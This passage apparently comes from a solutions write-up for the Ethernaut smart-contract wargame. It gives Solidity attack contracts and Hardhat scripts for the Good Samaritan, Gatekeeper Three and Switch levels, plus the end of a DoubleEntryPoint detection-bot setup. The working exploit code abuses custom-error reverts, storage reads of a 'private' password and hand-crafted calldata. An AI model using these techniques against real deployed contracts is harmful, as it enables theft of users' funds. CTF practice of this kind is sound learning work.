  //   CryptoVault.sweepToken(LegacyToken)
  //   LegacyToken.transfer(CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault))
  //   DoubleEntryPoint.delegateTransfer(CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault), CryptoVault)
  //   DoubleEntryPoint._transfer(CryptoVault, CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault))

  // This can be prevented by alerting on any DoubleEntryPoint.delegateTransfer where origSender == CryptoVault

  const detectionBot = await hre.ethers.deployContract("DetectionBot", [await cryptoVault.getAddress()]);
  await detectionBot.waitForDeployment();

  const forta = (await hre.ethers.getContractFactory("Forta")).attach(await doubleEntryPoint.forta());
  await forta.setDetectionBot(await detectionBot.getAddress());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 27 Good Samaritan

- Change the GoodSamaritan.sol import to be `@openzeppelin/contracts/utils/Address.sol`
- Run `npm install @openzeppelin/contracts`

```sol
pragma solidity ^0.8.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanAttack {
  GoodSamaritan goodSamaritan;
  Coin coin;

  error NotEnoughBalance();

  constructor(GoodSamaritan _goodSamaritan, Coin _coin) {
    goodSamaritan = _goodSamaritan;
    coin = _coin;
  }

  function attack() external {
    goodSamaritan.requestDonation();
  }

  function notify(uint256 amount) external {
    // Only the notify() from the wallet.donate10() should revert
    // (the notify() from the wallet.transferRemainer() should not)
    if (coin.balances(address(this)) == 10)
      revert NotEnoughBalance();
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const goodSamaritan = (await hre.ethers.getContractFactory("GoodSamaritan")).attach("<target contract address>");
  const wallet = (await hre.ethers.getContractFactory("Wallet")).attach(await goodSamaritan.wallet());
  const coin = (await hre.ethers.getContractFactory("Coin")).attach(await goodSamaritan.coin());
  console.log(`Coin.balances(Wallet) = ${await coin.balances(await wallet.getAddress())}`);

  const goodSamaritanAttack = await hre.ethers.deployContract("GoodSamaritanAttack", [await goodSamaritan.getAddress(), await coin.getAddress()]);
  await goodSamaritanAttack.waitForDeployment();
  (await goodSamaritanAttack.attack()).wait();
  console.log("Attack complete");

  console.log(`Coin.balances(Wallet) = ${await coin.balances(await wallet.getAddress())}`);
  console.log(`Coin.balances(GoodSamaritanAttack) = ${await coin.balances(await goodSamaritanAttack.getAddress())}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 28 Gatekeeper Three

```sol
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeAttack {
  function attack(GatekeeperThree target) external {
    target.construct0r();
    target.enter();
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const gatekeeperThree = (await hre.ethers.getContractFactory("GatekeeperThree")).attach("<target contract address>");
  console.log(`GatekeeperThree entrant = ${await gatekeeperThree.entrant()}`);

  const [ player ] = await hre.ethers.getSigners();
  console.log(`Player address: ${player.address}`);

  let trickAddress = await gatekeeperThree.trick();
  if (trickAddress == 0n) { // Uninitialized
    console.log("Calling GatekeeperThree.createTrick()");
    (await gatekeeperThree.createTrick()).wait();
    trickAddress = await gatekeeperThree.trick();
  }
  console.log(`GatekeeperThree trick address: ${trickAddress}`);

  const password = await hre.ethers.provider.getStorage(trickAddress, 2);
  console.log(`SimpleTrick password = ${password}`);
  console.log(`GatekeeperThree allowEntrance = ${await gatekeeperThree.allowEntrance()}`);
  (await gatekeeperThree.getAllowance(password)).wait();
  console.log(`GatekeeperThree allowEntrance = ${await gatekeeperThree.allowEntrance()}`);

  const balance = await hre.ethers.provider.getBalance(gatekeeperThree);
  if (balance < 1000000000000001n) {
    console.log(`Sending ${1000000000000001n-balance} wei to GatekeeperThree`);
    await player.sendTransaction({from:player.address, to:await gatekeeperThree.getAddress(), value:1000000000000001n-balance});
  }

  const gatekeeperThreeAttack = await hre.ethers.deployContract("GatekeeperThreeAttack");
  await gatekeeperThreeAttack.waitForDeployment();
  (await gatekeeperThreeAttack.attack(await gatekeeperThree.getAddress())).wait();

  console.log("Attack complete");
  console.log(`GatekeeperThree entrant = ${await gatekeeperThree.entrant()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 29 Switch

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Switch")).attach("<target contract address>");

  // Demonstration of calling flipSwitch with the turnSwichOff selector
  const turnSwitchOffSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("turnSwitchOff()")).toString().substring(2,10);
  (await target.flipSwitch("0x" + turnSwitchOffSelector)).wait();
  console.log("Successfully demonstrated flipSwitch()");

  // Demonstration of calling flipSwitch with the turnSwitchOff selector using call/sendTransaction
  const [ signer ] = await hre.ethers.getSigners();
  const flipSwitchSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("flipSwitch(bytes)")).toString().substring(2,10);
  (await signer.sendTransaction({
    from: signer.address,
    to: await target.getAddress(),
    data: "0x" + flipSwitchSelector + 
      hre.ethers.zeroPadValue("0x20", 32).substring(2) + // Offset of data (ie arguments)
      hre.ethers.zeroPadValue("0x04", 32).substring(2) + // Length of data
      turnSwitchOffSelector // Data
  })).wait();
  console.log("Successfully demonstrated flipSwitch() using sendTransaction()");

  console.log(`Switch switchOn = ${await target.switchOn()}`);

  const turnSwitchOnSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("turnSwitchOn()")).toString().substring(2,10);
  (await signer.sendTransaction({
    from: signer.address,
    to: await target.getAddress(),
    data: "0x" + flipSwitchSelector + 
      hre.ethers.zeroPadValue("0x60", 32).substring(2) + // Offset of data
      hre.ethers.zeroPadValue("0x00", 32).substring(2) +
      turnSwitchOffSelector + hre.ethers.zeroPadValue("0x00", 28).substring(2) +
      hre.ethers.zeroPadValue("0x04", 32).substring(2) + // Length of data
      turnSwitchOnSelector // Data
  })).wait();
  console.log("Attack complete");

  console.log(`Switch switchOn = ${await target.switchOn()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```
